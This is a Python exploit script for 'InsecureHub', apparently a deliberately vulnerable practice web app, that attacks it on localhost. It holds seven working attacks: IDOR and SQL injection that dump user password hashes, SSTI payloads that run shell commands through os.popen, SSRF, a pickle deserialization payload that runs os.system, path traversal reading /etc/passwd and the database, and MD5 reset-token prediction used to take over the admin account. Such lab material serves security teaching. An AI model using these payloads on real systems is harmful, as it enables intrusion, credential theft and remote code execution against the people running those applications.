#!/usr/bin/env python3
"""
InsecureHub — Exploit Scripts
==============================
Run each exploit against the running app at http://127.0.0.1:5000

Usage:
    python exploits/exploit_all.py

Or run individual exploits:
    python exploits/exploit_idor.py
    python exploits/exploit_ssti.py
    etc.
"""

import requests
import base64
import pickle
import hashlib
import os
import sys

BASE = "http://127.0.0.1:5000"

# ── ANSI Colors ──
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def banner(title):
    print(f"\n{BOLD}{CYAN}{'='*60}{RESET}")
    print(f"{BOLD}{CYAN}  {title}{RESET}")
    print(f"{BOLD}{CYAN}{'='*60}{RESET}")

def success(msg): print(f"  {GREEN}[+]{RESET} {msg}")
def info(msg):    print(f"  {CYAN}[*]{RESET} {msg}")
def warn(msg):    print(f"  {YELLOW}[!]{RESET} {msg}")
def fail(msg):    print(f"  {RED}[-]{RESET} {msg}")

# ─────────────────────────────────────────────
#  1. IDOR — Access Private Notes & Posts
# ─────────────────────────────────────────────
def exploit_idor():
    banner("EXPLOIT 1: IDOR — Insecure Direct Object Reference")
    s = requests.Session()

    # Login as alice (user id 2)
    info("Logging in as alice...")
    r = s.post(f"{BASE}/login", data={"username": "alice", "password": "password123"})
    if "Dashboard" in r.text or r.url.endswith("/dashboard"):
        success("Logged in as alice (user_id=2)")
    else:
        fail("Login failed")
        return

    # Access admin's private note (note_id=1)
    info("Accessing admin's private note (note_id=1)...")
    r = s.get(f"{BASE}/note/1")
    if "FLAG{IDOR_NOTE_ACCESS}" in r.text:
        success(f"FLAG FOUND in note: FLAG{{IDOR_NOTE_ACCESS}}")
    else:
        warn(f"Note content: {r.text[:200]}")

    # Access admin's private post (post_id=2)
    info("Accessing admin's private post (post_id=2)...")
    r = s.get(f"{BASE}/post/2")
    if "FLAG{IDOR_SUCCESS" in r.text:
        success("FLAG FOUND in post: FLAG{IDOR_SUCCESS_YOU_FOUND_ADMIN_POST}")
    else:
        warn(f"Post content: {r.text[:200]}")

    # Access admin's private file (file_id=1)
    info("Accessing admin's private file via IDOR (file_id=1)...")
    r = s.get(f"{BASE}/file/download/1")
    if r.status_code == 200:
        success(f"File downloaded! Size: {len(r.content)} bytes")
    else:
        warn(f"Response: {r.status_code}")

    # API IDOR — get all user data including password hashes
    info("Dumping all users via API IDOR...")
    for uid in range(1, 4):
        r = s.get(f"{BASE}/api/user/{uid}")
        if r.status_code == 200:
            data = r.json()
            success(f"User {uid}: {data.get('username')} | hash: {data.get('password')} | role: {data.get('role')}")

# ─────────────────────────────────────────────
#  2. SQL Injection — Dump Users Table
# ─────────────────────────────────────────────
def exploit_sqli():
    banner("EXPLOIT 2: SQL Injection — Dump Users Table")
    s = requests.Session()

    # Test basic injection
    info("Testing basic SQLi: ' OR 1=1--")
    r = s.get(f"{BASE}/search", params={"q": "' OR 1=1--"})
    if "post-card" in r.text or "post-title" in r.text:
        success("SQLi confirmed! All posts returned.")
    else:
        warn("Basic injection may not have worked as expected")

    # UNION-based injection to dump users
    info("Attempting UNION injection to dump users table...")
    payload = "' UNION SELECT id,username,password,email,bio,role,reset_token,created_at FROM users--"
    r = s.get(f"{BASE}/search", params={"q": payload})
    if "admin" in r.text.lower() or "md5" in r.text.lower() or "21232f" in r.text:
        success("User data leaked via UNION injection!")
        success("Admin password hash visible in results")
    else:
        info("Check the page source for leaked data")

    # Crack the MD5 hash
    info("Cracking MD5 hashes (admin123, password123, bob123)...")
    for pw in ["admin123", "password123", "bob123", "secret", "123456"]:
        h = hashlib.md5(pw.encode()).hexdigest()
        success(f"  MD5({pw!r}) = {h}")

# ─────────────────────────────────────────────
#  3. SSTI — Server-Side Template Injection
# ─────────────────────────────────────────────
def exploit_ssti():
    banner("EXPLOIT 3: SSTI — Server-Side Template Injection")
    s = requests.Session()

    # Login as alice
    info("Logging in as alice...")
    s.post(f"{BASE}/login", data={"username": "alice", "password": "password123"})

    # Basic math test
    info("Testing basic SSTI: {{7*7}}")
    r = s.post(f"{BASE}/render", data={"template": "{{7*7}}"})
    if "49" in r.text:
        success("SSTI confirmed! {{7*7}} = 49")

    # Leak secret key
    info("Leaking Flask secret key...")
    r = s.post(f"{BASE}/render", data={"template": "{{config.SECRET_KEY}}"})
    if "supersecretkey" in r.text:
        success("SECRET KEY LEAKED: supersecretkey123")

    # Leak config object
    info("Dumping full config object...")
    r = s.post(f"{BASE}/render", data={"template": "{{config}}"})
    if "SECRET_KEY" in r.text:
        success("Full config dumped!")

    # RCE via SSTI
    info("Attempting RCE via SSTI (id command)...")
    # Find the right subclass index for subprocess.Popen or os._wrap_close
    rce_payloads = [
        # Try common indices
        "{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['os'].popen('id').read()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    ]
    for payload in rce_payloads:
        r = s.post(f"{BASE}/render", data={"template": payload})
        if "uid=" in r.text:
            success(f"RCE ACHIEVED! Output: {r.text[r.text.find('uid='):r.text.find('uid=')+50]}")
            break
        else:
            warn(f"Payload didn't execute RCE, trying next...")

    # SSTI via bio (stored)
    info("Injecting SSTI payload into bio (stored)...")
    r = s.post(f"{BASE}/profile/edit", data={"bio": "{{config.SECRET_KEY}}"})
    r = s.get(f"{BASE}/bio/2")
    if "supersecretkey" in r.text:
        success("Stored SSTI via bio! Secret key leaked from bio page.")

# ─────────────────────────────────────────────
#  4. SSRF — Server-Side Request Forgery
# ─────────────────────────────────────────────
def exploit_ssrf():
    banner("EXPLOIT 4: SSRF — Server-Side Request Forgery")
    s = requests.Session()

    info("Logging in as alice...")
    s.post(f"{BASE}/login", data={"username": "alice", "password": "password123"})

    # Access internal debug endpoint
    info("Fetching internal /debug endpoint via SSRF...")
    r = s.post(f"{BASE}/fetch", data={"url": "http://127.0.0.1:5000/debug"})
    if "secret_key" in r.text.lower() or "supersecretkey" in r.text:
        success("Internal /debug endpoint accessed!")
        success("SECRET KEY leaked via SSRF!")

    # Access admin panel via SSRF
    info("Accessing /admin via SSRF (bypassing browser auth check)...")
    r = s.post(f"{BASE}/fetch", data={"url": "http://127.0.0.1:5000/api/user/1"})
    if "admin" in r.text:
        success("Admin user data fetched via SSRF!")

    # Try to access internal API
    info("Fetching all users via internal API through SSRF...")
    for uid in range(1, 4):
        r = s.post(f"{BASE}/fetch", data={"url": f"http://localhost:5000/api/user/{uid}"})
        if '"username"' in r.text:
            import json
            # Extract from the page
            start = r.text.find('{')
            end   = r.text.rfind('}') + 1
            if start != -1:
                try:
                    data = json.loads(r.text[start:end])
                    success(f"User {uid}: {data.get('username')} | {data.get('password')}")
                except:
                    success(f"User {uid} data fetched")

# ─────────────────────────────────────────────
#  5. Pickle RCE — Deserialization Attack
# ─────────────────────────────────────────────
def exploit_pickle():
    banner("EXPLOIT 5: Pickle RCE — Deserialization Attack")
    s = requests.Session()

    # Craft malicious pickle payload
    info("Crafting malicious pickle payload...")

    class RCEPayload:
        def __reduce__(self):
            import os
            cmd = "id > /tmp/pwned.txt && whoami >> /tmp/pwned.txt"
            return (os.system, (cmd,))

    # Serialize the malicious object
    malicious_pickle = base64.b64encode(pickle.dumps(RCEPayload())).decode()
    success(f"Malicious cookie crafted: {malicious_pickle[:60]}...")

    # Set the cookie and trigger deserialization
    info("Setting malicious remember_me cookie...")
    s.cookies.set("remember_me", malicious_pickle)

    info("Triggering deserialization via /restore-session...")
    r = s.get(f"{BASE}/restore-session", allow_redirects=False)
    success(f"Response: {r.status_code}")

    # Also craft a session hijack payload (elevate to admin)
    info("Crafting session hijack payload (become admin)...")

    class AdminSession:
        def __reduce__(self):
            # This payload makes the server set admin session
            return (dict, ({"user_id": 1, "username": "admin", "role": "admin"},))

    hijack_cookie = base64.b64encode(pickle.dumps(AdminSession())).decode()
    success(f"Session hijack cookie: {hijack_cookie[:60]}...")
    info("Set this as your remember_me cookie and visit /restore-session")
    info(f"Full cookie value:\n{hijack_cookie}")

# ─────────────────────────────────────────────
#  6. Path Traversal — Read Arbitrary Files
# ─────────────────────────────────────────────
def exploit_path_traversal():
    banner("EXPLOIT 6: Path Traversal — Read Arbitrary Files")
    s = requests.Session()

    info("Logging in as alice...")
    s.post(f"{BASE}/login", data={"username": "alice", "password": "password123"})

    # Try to read app source code
    targets = [
        "../app.py",
        "../../etc/passwd",
        "../insecurehub.db",
        "admin_secret.txt",
        "../requirements.txt",
    ]

    for target in targets:
        info(f"Attempting path traversal: {target}")
        r = s.get(f"{BASE}/file/read", params={"name": target})
        if "Error" not in r.text and len(r.text) > 200:
            success(f"SUCCESS! Read: {target}")
            # Show first 100 chars of content
            start = r.text.find('<pre') 
            if start != -1:
                snippet = r.text[start:start+200]
                success(f"Content preview: {snippet[:100]}...")
        else:
            warn(f"Failed or empty: {target}")

# ─────────────────────────────────────────────
#  7. Weak Password Reset Token
# ─────────────────────────────────────────────
def exploit_weak_reset():
    banner("EXPLOIT 7: Weak Password Reset Token Prediction")
    s = requests.Session()

    info("Predicting reset tokens for all users...")
    for username in ["admin", "alice", "bob"]:
        token = hashlib.md5(username.encode()).hexdigest()
        success(f"Predicted token for '{username}': {token}")

    # Trigger reset for admin
    info("Triggering password reset for admin...")
    r = s.post(f"{BASE}/forgot-password", data={"username": "admin"})
    success("Reset token generated (MD5 of 'admin')")

    # Use predicted token to reset admin password
    admin_token = hashlib.md5(b"admin").hexdigest()
    info(f"Using predicted token: {admin_token}")
    r = s.post(f"{BASE}/reset-password", data={
        "token": admin_token,
        "password": "hacked123"
    })
    if "Password reset" in r.text or r.url.endswith("/login"):
        success("Admin password reset to 'hacked123'!")
    else:
        warn("Reset may have failed — check manually")

    # Restore original password
    info("Restoring admin password...")
    s.post(f"{BASE}/forgot-password", data={"username": "admin"})
    s.post(f"{BASE}/reset-password", data={
        "token": admin_token,
        "password": "admin123"
    })
    success("Admin password restored to 'admin123'")

# ─────────────────────────────────────────────
#  Main
# ─────────────────────────────────────────────
if __name__ == "__main__":
    print(f"""
{BOLD}{CYAN}
  ██╗███╗   ██╗███████╗███████╗ ██████╗██╗   ██╗██████╗ ███████╗██╗  ██╗██╗   ██╗██████╗ 
  ██║████╗  ██║██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██╔════╝██║  ██║██║   ██║██╔══██╗
  ██║██╔██╗ ██║███████╗█████╗  ██║     ██║   ██║██████╔╝█████╗  ███████║██║   ██║██████╔╝
  ██║██║╚██╗██║╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██╔══╝  ██╔══██║██║   ██║██╔══██╗
  ██║██║ ╚████║███████║███████╗╚██████╗╚██████╔╝██║  ██║███████╗██║  ██║╚██████╔╝██████╔╝
  ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ 
{RESET}
{YELLOW}  ⚠  FOR EDUCATIONAL USE ONLY — Run against localhost only!{RESET}
""")

    exploits = {
        "1": ("IDOR",           exploit_idor),
        "2": ("SQL Injection",  exploit_sqli),
        "3": ("SSTI",           exploit_ssti),
        "4": ("SSRF",           exploit_ssrf),
        "5": ("Pickle RCE",     exploit_pickle),
        "6": ("Path Traversal", exploit_path_traversal),
        "7": ("Weak Reset",     exploit_weak_reset),
    }

    if len(sys.argv) > 1 and sys.argv[1] == "all":
        for key, (name, fn) in exploits.items():
            fn()
    else:
        print(f"{BOLD}Available Exploits:{RESET}")
        for key, (name, _) in exploits.items():
            print(f"  [{key}] {name}")
        print(f"  [a] Run ALL exploits\n")
        choice = input("Select exploit: ").strip().lower()
        if choice == "a":
            for key, (name, fn) in exploits.items():
                fn()
        elif choice in exploits:
            exploits[choice][1]()
        else:
            fail("Invalid choice")
